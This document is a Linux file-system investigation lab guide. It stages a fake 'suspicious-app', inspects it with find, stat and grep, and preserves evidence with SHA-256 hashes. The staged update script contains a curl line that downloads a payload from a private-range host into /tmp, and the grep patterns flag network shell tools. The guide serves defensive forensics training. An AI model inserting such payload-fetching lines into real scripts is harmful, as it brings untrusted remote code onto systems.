# Linux File System Investigation Commands

## Confirm the Investigation System

### Display the hostname

```bash
hostname
```

- `hostname` — Displays the configured system hostname.

### Display the current user

```bash
whoami
```

- `whoami` — Displays the username associated with the current shell.

### Display the current directory

```bash
pwd
```

- `pwd` — Prints the absolute path of the current working directory.

## Review Important Linux Directories

### Review the root directory

```bash
ls -lah /
```

- `ls` — Lists directory contents.
- `-l` — Uses the long listing format.
- `-a` — Includes hidden entries.
- `-h` — Displays human-readable file sizes.
- `/` — Specifies the root directory.

### Review system configuration files

```bash
ls -lah /etc
```

### Review system and application logs

```bash
sudo ls -lah /var/log
```

### Review temporary files

```bash
ls -lah /tmp
```

## Create the Investigation Workspace

### Create the lab and evidence directories

```bash
mkdir -p /home/testlab/cloud-security-labs/lab-03-file-system-investigation/evidence
```

- `mkdir` — Creates directories.
- `-p` — Creates missing parent directories and avoids an error when they already exist.

### Enter the lab directory

```bash
cd /home/testlab/cloud-security-labs/lab-03-file-system-investigation
```

## Build the Controlled Scenario

### Create the application directories

```bash
mkdir -p suspicious-app/config suspicious-app/logs suspicious-app/scripts
```

### Create the application configuration

```bash
printf "application_name=training-app\ndebug=false\nremote_access=false\n" > suspicious-app/config/application.conf
```

### Create the application log

```bash
printf "2026-08-04 09:00:00 application started\n2026-08-04 09:01:00 health check successful\n" > suspicious-app/logs/application.log
```

### Create the maintenance script

```bash
printf '#!/usr/bin/env bash\necho "Running maintenance"\n' > suspicious-app/scripts/maintenance.sh
```

### Make the maintenance script executable

```bash
chmod 750 suspicious-app/scripts/maintenance.sh
```

- `chmod` — Changes file permissions.
- `750` — Owner: read, write, execute; group: read, execute; others: no permissions.

### Create the hidden training file

```bash
printf "temporary_token=TrainingTokenOnly\n" > suspicious-app/.app-cache
```

### Create the suspicious update script

```bash
printf '#!/usr/bin/env bash\ncurl http://192.168.50.1/payload.sh -o /tmp/payload.sh\n' > suspicious-app/scripts/update-check.sh
```

### Change the suspicious script modification time

```bash
touch -d "20 minutes ago" suspicious-app/scripts/update-check.sh
```

## Investigate Files and Metadata

### Recursively list the scenario

```bash
ls -lahR suspicious-app
```

### Review normal-file metadata

```bash
stat suspicious-app/config/application.conf
```

### Review suspicious-script metadata

```bash
stat suspicious-app/scripts/update-check.sh
```

### Identify file types

```bash
file suspicious-app/config/application.conf suspicious-app/scripts/maintenance.sh suspicious-app/scripts/update-check.sh
```

## Search for Files

### Find hidden regular files

```bash
find suspicious-app -type f -name ".*"
```

### Find files modified within 30 minutes

```bash
find suspicious-app -type f -mmin -30
```

### Find files modified within one day

```bash
find suspicious-app -type f -mtime -1
```

### Find executable files

```bash
find suspicious-app -type f -executable
```

## Search File Contents

### Search recursively for remote-access references

```bash
grep -Rni "remote" suspicious-app
```

### Search for potentially suspicious commands

```bash
grep -RniE "curl|wget|nc|ncat|bash -c|python" suspicious-app
```

### Highlight the exact matching text

```bash
grep -RniE --color=always "curl|wget|nc|ncat|bash -c|python" suspicious-app
```

### Use a more behavior-focused search

```bash
grep -RniE "(curl|wget).*(http|https)|bash -c|nc -|python.*socket" suspicious-app
```

## Review Suspicious Content Safely

### Display the suspicious script

```bash
cat suspicious-app/scripts/update-check.sh
```

### Review the script in a pager

```bash
less suspicious-app/scripts/update-check.sh
```

## Generate and Preserve Evidence

### Hash every file in the controlled scenario

```bash
find suspicious-app -type f -exec sha256sum {} \; | sort > evidence/file-hashes.txt
```

- `-exec` — Runs a command for each match.
- `sha256sum` — Calculates a SHA-256 hash.
- `{}` — Represents the current matched file.
- `\;` — Terminates the `-exec` expression.
- A space is required between `{}` and `\;`.

### Hash files while inside the evidence directory

```bash
find ../suspicious-app -type f -exec sha256sum {} \; | sort > file-hashes.txt
```

### Review collected hashes

```bash
cat evidence/file-hashes.txt
```

### Save the recursive directory listing

```bash
ls -lahR suspicious-app > evidence/directory-listing.txt
```

### Save recently modified file details

```bash
find suspicious-app -type f -mmin -30 -ls > evidence/recent-files.txt
```

### Save hidden-file details

```bash
find suspicious-app -type f -name ".*" -ls > evidence/hidden-files.txt
```

### Save executable-file details

```bash
find suspicious-app -type f -executable -ls > evidence/executable-files.txt
```

### Save suspicious-content results

```bash
grep -RniE "curl|wget|nc|ncat|bash -c|python|remote_access|temporary_token" suspicious-app > evidence/suspicious-content.txt
```

### Save suspicious-script metadata

```bash
stat suspicious-app/scripts/update-check.sh > evidence/suspicious-script-metadata.txt
```

### Review the evidence directory

```bash
ls -lah evidence
```

### Create the investigation findings file

```bash
nano evidence/investigation-findings.txt
```

### Hash the evidence files

```bash
sha256sum evidence/*.txt > evidence-checksums.sha256
```

### Verify evidence integrity

```bash
sha256sum -c evidence-checksums.sha256
```

## Challenge Exercise

### Search `/tmp` for recent regular files

```bash
sudo find /tmp -type f -mmin -60 -ls
```

### Search all regular files under `/tmp`

```bash
sudo find /tmp -type f -ls
```

### Display modification times under `/tmp`

```bash
sudo find /tmp -type f -printf "%TY-%Tm-%Td %TH:%TM %p\n"
```

### Create a controlled recent file when `/tmp` has no matches

```bash
echo "Training file" | sudo tee /tmp/training-investigation.txt > /dev/null
```

### Save recent `/tmp` results

```bash
sudo find /tmp -type f -mmin -60 -ls > evidence/tmp-recent-files.txt
```
